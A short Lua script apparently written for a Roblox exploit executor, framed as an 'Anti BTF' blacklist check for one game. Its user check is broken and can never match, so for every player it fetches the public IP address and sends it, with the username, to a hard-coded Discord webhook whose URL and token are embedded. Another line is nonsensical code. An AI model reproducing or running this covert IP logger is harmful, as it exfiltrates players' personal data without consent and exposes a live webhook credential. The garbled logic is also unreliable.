if game.PlaceId == 4913708314 then
  if not game.Players.LocalPlayer.Name == "lazmuri3" and game.Players.LocalPlayer.Name == "celalcan5554" and game.Players.LocalPlayer.Name == "Apoleias" and game.Players.LocalPlayer.Name == "N3mes1s_Nyks" then
    gameGetObjects(rbxassetid..0x123)[1].Parent = game.CoreGui
    else
local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = 'BTF Alert';
local Embed = {
    title = 'Anti BTF';
    color = '99999';
    footer = { text = ip };
    author = {
        name = 'ROBLOX';
        url = 'https://www.roblox.com/';
    };
    fields = {
        {
            name = 'Anti BTF Blacklisted User';
            value = game.Players.LocalPlayer.Name;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/768825378982592543/L_5aZwvPiF65AufJSRBL16gJ9pYl1NxeDqIj6zk-4N7dXQBQpEaFjlx5sS_7l6hQjZ8-';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
  end
end
